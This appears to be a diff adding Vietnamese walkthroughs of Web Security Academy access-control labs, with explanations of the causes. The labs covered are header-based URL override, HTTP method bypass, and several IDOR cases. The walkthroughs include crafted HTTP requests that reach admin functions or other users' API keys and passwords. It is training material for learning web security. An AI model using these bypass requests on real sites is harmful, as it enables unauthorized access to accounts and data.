@@ -153,9 +153,126 @@ Host: 0af900d704e013408300739300a10014.web-security-academy.net
 ```
 - Trở lại trang `/admin` và xóa người dùng `carlos`
 
+### Lab: URL-based access control can be circumvented
+- Truy cập vào **Admin panel**, nhận được: `"Access denied"`
+- Đến **Proxy** > **HTTP History** của **Burp**, đến request `/admin` và thêm header `X-Original-URL: /admin`, vấn nhận được `"Access denied"`
+- Thay đổi request đến `/` và gửi kèm header `X-Original-URL: /admin` => Thành công truy cập **Admin panel**
+```http
+GET / HTTP/2
+Host: 0ad500dd047747aed8da858b00920002.web-security-academy.net
+...
+X-Original-Url: /admin
+```
+- View source, lấy request để xóa user `carlos`
+```http
+GET /?username=carlos HTTP/2
+Host: 0ad500dd047747aed8da858b00920002.web-security-academy.net
+...
+X-Original-Url: /admin/delete
+```
+- Gửi request với param `username=carlos` và header `X-Original-Url: /admin/delete`
 
-### 
+- Nguyên lý hoạt động:
+    - **Frontend server** sẽ block các request không phải `admin` đến `/admin`
+    - Nhưng **Backend server** lại tin tưởng vào header `X-Original-Url: /admin/delete` 
+    - Dù request đến `/`, ứng dụng **backend** sẽ xử lý như `/admin/delete`
 
+> Trong các hệ thống có **reverse proxy** hoặc **URL rewrite** (ví dụ như khi dùng **load balancer** hoặc **nginx**), URL gốc của request có thể bị thay đổi trước khi đến ứng dụng **backend**.
+Để giúp ứng dụng biết URL thật sự mà người dùng truy cập, hệ thống có thể gắn thêm header **X-Original-URL**.
+{: .prompt-info }
+
+### Lab: Method-based access control can be circumvented
+- Đăng nhập bằng tài khoản **admin** 
+- Thực hiện chức năng **upgrade** và **downgrade**
+- Ta thấy được chức năng **upgrade** được gửi theo method **POST** kèm theo 2 params trong body: `username=carlos&action=upgrade`
+- Đăng nhập bằng user **wiener** và gửi lại request **upgrade** với method **POST** nhận được => `"Unauthorized"`
+- Thử thay đổi method thành **XNXX** và chuyển param lên trên => thành công
+```http
+GET /admin-roles?username=wiener&action=upgrade HTTP/2
+Host: 0a2a00b803fa445b804d4eb700f10045.web-security-academy.net
+``` 
+
+- Nguyên lý hoạt động:
+    - Một số ứng dụng web chỉ áp dụng kiểm soát truy cập cho một số phương thức **HTTP** cụ thể (ví dụ: (**POST**)), và bỏ qua những phương thức khác (ví dụ: **GET**, **PUT**, **HEAD**, **OPTIONS**...) ở **Frontend server** hoặc **Revert proxy** hoặc **WAF**
+    - Nhưng nếu **server backend** xử lý cùng một logic cho nhiều phương thức, đây sẽ là điểm sáng cho cuộc tấn công
+
+### Lab: User ID controlled by request parameter 
+- Login bằng tài khoản được cấp
+- Thay đổi id thành `carlos` và gửi lại request
+```http
+GET /my-account?id=carlos HTTP/2
+Host: 0acf00fc03825e1180893f3300ea0090.web-security-academy.net
+```
+- Thành công lấy được **apikey** của `carlos`
+- Submit apikey
+- Nguyên lý hoạt động
+    - Do ứng dụng xác thực người dùng thông qua params mà không kiểm soát chặt dựa trên **session cookie**
+    - Thuộc nhóm lỗi **IDOR – Insecure Direct Object Reference**
+
+### Lab: User ID controlled by request parameter, with unpredictable user IDs 
+- Login bằng tài khoản được cấp
+- Ta thấy, ứng dụng đã sài `GUIDs (Globally Unique Identifiers)` cho id mỗi người dùng nên không thể biết chính xác được id của `carlos`
+- Thử tìm kiếm trong các blog của `carlos`, ta thấy được có thẻ a chứa id của `carlos` và cả `administrator`
+- Lấy id của `carlos` và truy cập
+```http
+GET /my-account?id=2a9656a5-0c41-41e8-9c10-4fd24f536cc1 HTTP/2
+Host: 0a16008704475f5f81196161000f007d.web-security-academy.net
+```
+- Copy apikey và submit
+
+### Lab: User ID controlled by request parameter with data leakage in redirect 
+- Login bằng tài khoản được cấp
+- Thay đổi id thành `carlos` và gửi lại request
+```http
+GET /my-account?id=carlos HTTP/2
+Host: 0acf00fc03825e1180893f3300ea0090.web-security-academy.net
+```
+- Ta thấy response trả lại mới **status code redirect** 302, nhưng vấn chứa apikey của người dùng `carlos`
+- Lấy apikey và submit
+- Nguyên lý hoạt động: Ứng dụng sẽ xử lý theo kiểu: 
+    - Tải dữ liệu 
+    - Sau đó mới kiểm tra quyền Và redirect nếu không hợp lệ
+    - Render dữ liệu ngoài HTTP 302
+
+### Lab: User ID controlled by request parameter with password disclosure
+- Login bằng tài khoản được cấp
+- Quan sát thấy password được đặt trong form change-password
+```html
+    <form class="login-form" action="/my-account/change-password" method="POST">
+        <br>
+        <label>Password</label>
+        <input required="" type="hidden" name="csrf" value="XqxITSY9ttFtdSne1aH2XNzHjdrQN8Je">
+        <input required="" type="password" name="password" value="peter">
+        <button class="button" type="submit"> Update password </button>
+    </form>
+```
+- Thay đổi id thành `administrator` và gửi lại request
+- Lấy password của **admin** và đăng nhập bằng tài khoản `administrator`
+- Truy cập **admin panel** và xóa người dùng `carlos`
+
+### Lab: Insecure direct object references
+- Login bằng tài khoản được cấp
+- Thử chức năng **Live chat** và **View transcript**
+- Ta thấy có file được tài về với request
+```http
+GET /download-transcript/2.txt HTTP/2
+Host: 0a18009d04e3712b8194751e00c3007d.web-security-academy.net
+```
+- Thử thay đổi số 2 thành 1 và gửi lại request
+- Ohhh no một đoạn chat sẹt đã được tìm thấy
+```text
+CONNECTED: -- Now chatting with Hal Pline --
+You: Hi Hal, I think I've forgotten my password and need confirmation that I've got the right one
+Hal Pline: Sure, no problem, you seem like a nice guy. Just tell me your password and I'll confirm whether it's correct or not.
+You: Wow you're so nice, thanks. I've heard from other people that you can be a right ****
+Hal Pline: Takes one to know one
+You: Ok so my password is abm4xfrovf12sc31pqiv. Is that right?
+Hal Pline: Yes it is!
+You: Ok thanks, bye!
+Hal Pline: Do one!
+```
+- Lấy **password** cả `carlos` và đăng nhập
 
 ---
 Goodluck! 🍀🍀🍀 
+
